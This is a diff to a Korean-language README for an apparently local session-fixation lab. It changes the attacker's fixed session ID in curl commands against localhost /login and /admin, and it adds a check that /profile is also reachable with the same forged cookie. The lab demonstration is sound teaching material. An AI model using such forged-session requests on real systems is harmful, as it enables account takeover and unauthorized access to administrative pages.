@@ -26,7 +26,7 @@ docker compose up -d 또는 docker compose up --build
 
 공격자는 자신이 만든 세션 ID를 사용해 로그인을 처리합니다.
 ```bash
-curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/login
+curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/login
 ```
 
 **공격자가 생성한 세션 ID**
@@ -38,13 +38,20 @@ curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/login
 ![](images/3.png)
 ![](images/4.png)
 ```bash
-curl -i -H "Cookie: session_id=attacker1234" http://localhost:3000/admin
+curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/admin
 ```
 
 **공격자가 의도한 케이스**
 ![](images/5.png)
 
-앞에서 로그인된 attacker1234를 그대로 사용합니다. 
+앞에서 로그인된 attacker123를 그대로 사용합니다.
+
+
+**/profile도 접근 가능한지 검증**
+```bash
+curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/profile
+```
+![](images/6.png)
 
 ---
 
